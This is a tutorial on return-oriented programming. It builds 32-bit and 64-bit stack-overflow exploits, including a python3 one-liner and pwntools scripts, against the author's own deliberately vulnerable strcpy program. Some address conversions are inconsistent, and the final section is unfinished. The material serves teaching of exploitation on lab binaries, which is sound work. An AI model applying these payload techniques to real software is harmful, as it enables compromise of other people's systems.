---
description: 10/04/2023
cover: >-
  https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/07340e39-3680-4b82-914d-8e1316dd3f34/deaf72d-a8b1de48-37d8-49df-b109-5609139d6180.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzA3MzQwZTM5LTM2ODAtNGI4Mi05MTRkLThlMTMxNmRkM2YzNFwvZGVhZjcyZC1hOGIxZGU0OC0zN2Q4LTQ5ZGYtYjEwOS01NjA5MTM5ZDYxODAuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.v2ez8ipnLPd0eWwuX7J3jtSu7ae4KHHZfltPYv78Eko
coverY: 0
---

# ⛓️ ROP Chains 101

## Introduction

<mark style="color:yellow;">**Return-Oriented Programming**</mark> (<mark style="color:yellow;">**ROP**</mark>) will allow you to utilize functions either found in the program or dynamically linked in a shared library such as `libc`.&#x20;

When you complete a function's flow of execution, it will execute a `ret` instruction, likely to `main()`. We want to overwrite this `ret` instruction with the `ebp` address of our target function instead.

## 32-bit Exploitation

`rop1.c`:

```c
#include <stdio.h>>
#include <string.h>

void rop1() 
{
    printf("ROP 1!\n");
}

void rop2() {
    printf("ROP 2!\n");
}

void rop3() {
    printf("ROP 3!\n");
}

void vulnerable(char* string) 
{
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) 
{
    vulnerable(argv[1]);
    return 0;
}
```

<mark style="color:yellow;">Notice how this program requires the usage of an argument</mark>, which will utilize `strcpy()` to store the argument in our buffer and variable, `string`.&#x20;

### Visual Depiction

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Compiling our binary

```
gcc rop1.c -o rop1 -m32 -fno-stack-protector -no-pie -z execstack
```

### ROP Chain Structure

The ROP chain for this program could have many variations, but one could be: `rop1()` -> `rop2()` -> `rop3` -> `exit()`(dynamically-linked to `libc`).

Notice how this is combining _**ret2libc**_ and _**ret2win**_ techniques.

### Finding `EBP` Offset

**Generate a cyclic pattern of 200-bytes:**

```
cyclic 200
```

**Then, copy/paste the pattern and send it to the program as an argument:**

{% code overflow="wrap" %}
```
r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Generating pattern to find <code>EBP</code> offset</p></figcaption></figure>

Great, we now found our padding.&#x20;

It will be 108 because we are subtracting 4-bytes to make room for the `EIP`.

### Using `pwndbg` to find addresses

```
disass rop1
   0x08049182 <+0>:     push   ebp
   
disass rop2
   0x080491ad <+0>:     push   ebp
   
disass rop3
   0x080491d8 <+0>:     push   ebp

disass exit
   0xf7dbb460 <+0>:     endbr32
```

### Using `objdump` to find addresses

```
objdump -d rop1 | grep rop1
rop1:     file format elf32-i386
08049182 <rop1>:

objdump -d rop1 | grep rop2
080491ad <rop2>:

objdump -d rop1 | grep rop3
080491d8 <rop3>:
```

### Payload Structure

**Payload Structure to achieve our ROP chain:**&#x20;

`AAAA`'s (to get to `EIP`) + `B`'s (to overwrite `EBP` with garbage) + `&rop1` + `&rop2` + `&rop3` + `&exit`

**Remember:** <mark style="color:yellow;">We will need to place our obtained addresses above in little-endian format in order for our payload to work</mark>.

### Using `python3` to Manually Exploit our Target Binary

{% code overflow="wrap" %}
```
./rop1 "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*108 + b'\x42\x42\x42\x42' + b'\x82\x91\x04\x08' + b'\xad\x91\x04\x08' + b'\xd8\x91\x04\x08' + b'\x60\xb4\xdb\xf7')")"
```
{% endcode %}

#### Result

```
./rop1 "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*108 + b'\x42\x42\x42\x42' + b'\x82\x91\x04\x08' + b'\xad\x91\x04\x08' + b'\xd8\x91\x04\x08' + b'\x60\xb4\xdb\xf7')")"
ROP 1!
ROP 2!
ROP 3!
Segmentation fault
```

### Using pwntools to Automate our Exploit Development

`exploit.py`:

```python
#!/usr/bin/python3
from pwn import *
import sys

# Set up pwntools for the correct architecture and target
exe = './rop1'
exe = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
p = process(exe.path)
# This will automatically get context arch, bits, os etc
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# DEBUGGING and ARGUMENTS
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# How many bytes to the instruction pointer (EIP)?
padding = 108
junk = b'\x42\x42\x42\x42'
exitFunc = 0xf7dbb460
# rop1 = 0x08049182
# rop2 = 0x080491ad
# rop3 = 0x080491d8

rop = ROP(exe)
rop.rop1()
rop.rop2()
rop.rop3()

payload = flat(
    b'A' * padding,
    junk,
    rop.chain(),
    exitFunc
)

# Write the payload to file
write('pwntoolsPayload', payload)
print("[+] Wrote payload to file named pwntoolsPayload")

# Send the payload
p = process([exe.path, payload])

# # Receive the flag
p.interactive()
```

### Analyzing our Exploit in `pwndbg`

In order to find out exactly what is going on, we will step through the flow of execution in `pwndbg`.



## 64-bit Exploitation

Given the same binary as above, let's compile it as a 64-bit binary and remove the `-m32` flag for `gcc`:

```
gcc rop1.c -o rop1-x64 -fno-stack-protector -no-pie -z ex
ecstack
```

### Using `pwndbg` to find addresses

```
disass rop1
Dump of assembler code for function rop1:
   0x0000000000401156 <+0>:     endbr64
   
disass rop2
Dump of assembler code for function rop2:
   0x000000000040116d <+0>:     endbr64
   
disass rop3
Dump of assembler code for function rop3:
   0x0000000000401184 <+0>:     endbr64
   
   disass exit
Dump of assembler code for function __GI_exit:
   0x00007ffff7dd05f0 <+0>:     endbr64
```

### Using `objdump` to find addresses

```
 objdump -d rop1-x64 | grep rop1
rop1-x64:     file format elf64-x86-64
0000000000401156 <rop1>:

 objdump -d rop1-x64 | grep rop2
000000000040116d <rop2>:

objdump -d rop1-x64 | grep rop3
0000000000401184 <rop3>:
```

### Finding `ret` Gadget

```
ropper --file=rop1-x64 --search ret
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: rop1-x64
0x000000000040101a: ret;
```

### Payload Structure

`AAAA`'s (to get to `RIP`) + `B`'s (to overwrite `RBP` with garbage) + `&ret_gadget` + `&rop1` + `&rop2` + `&rop3` + `&exit`

Great, we now have all the information we need, we just need to put it all in little-endian format to make it work in our payload.

#### Converting Addresses to Little-Endian

`&rop1()`: `0000000000401156` -> `\x56\x11\x40\x00\x00\x00\x00\x00`

`&rop2()`: `000000000040116d` -> `\x6d\x11\x40\x00\x00\x00\x00\x00`

`&rop3()`: `0000000000401184` -> `\x84\x11\x40\x00\x00\x00\x00\x00`

`&exit()`: `0x00007ffff7dd05f0` -> `\xf0\x05\xdd\xf7\xff\xff\x07\x00`

`&ret_gadget`: `0x000000000040101a` -> `\x1a\x10\x40\x00\x00\x00\x00\x00`

`&exit()`: `0x00007ffff7dd05f0` ->  `\xf0\x05\xdd\xf7\xff\xff\x00\x00`

### Using pwntools to Automate Exploitation

`exploit-x64.py`:

```python
#!/usr/bin/python3
from pwn import *
import sys

# Set up pwntools for the correct architecture and target
exe = './rop1'
exe = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
p = process(exe.path)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# How many bytes to the instruction pointer (EIP)?
padding = 112
#junk = b'\x42\x42\x42\x42\x42\x42\x42\42'
# rop1 = 0000000000401156
# rop2 = 000000000040116d 
# rop3 = 0000000000401184 
#exitFunc = b'\xf0\x05\xdd\xf7\xff\xff\x00\x00' #0x00007ffff7dd05f0 \xf0\x05\xdd\xf7\xff\xff\x00\x00
#ret = b'\x1a\x10\x40\x00\x00\x00\x00\x00' #0x000000000040101a

# ROP Chain Structure
rop = ROP(exe)
rop.rop1()
rop.rop2()
rop.rop3()

# Print out ROP addresses
print('(+) ROP Chain Structure:')
info('rop1() address:%#x', exe.sym['rop1'])
info('rop2() address:%#x', exe.sym['rop2'])
info('rop3() address:%#x', exe.sym['rop3'])

payload = flat(
    b'A' * padding,
    rop.chain(),
)

# Write the payload to file
write('pwntoolsPayload-x64', payload)
print("[+] Wrote payload to file named pwntoolsPayload-x64")

# Send the payload
p = process([exe.path, payload])

# Receive the flag
p.interactive()
```

#### Result

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption><p>Result</p></figcaption></figure>

## BONUS: ROP II

We will now be attacking a very similar binary.

However, `rop2(int a)` and `rop3(int a, int b)` will take arguments.

This adds a layer of complexity that we will cover below.

We will need to pass 1 argument to `rop2()` and 2 arguments to `rop3()`.

`rop2.c`:

```c
#include <stdio.h>
#include <string.h>

void rop1() {
    printf("ROP 1!\n");
}

void rop2(int a) {
    printf("ROP 2: %x!\n", a);
}

void rop3(int a, int b) {
    printf("ROP 3: %x, %x!\n", a, b);
}

void vulnerable(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable(argv[1]);
    return 0;
}
```

### Visual Depiction

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ROP Chain Structure

## To-do:

* [ ] Show steps of stepping through exploits in `pwndbg`
* [ ] Finish ROP II
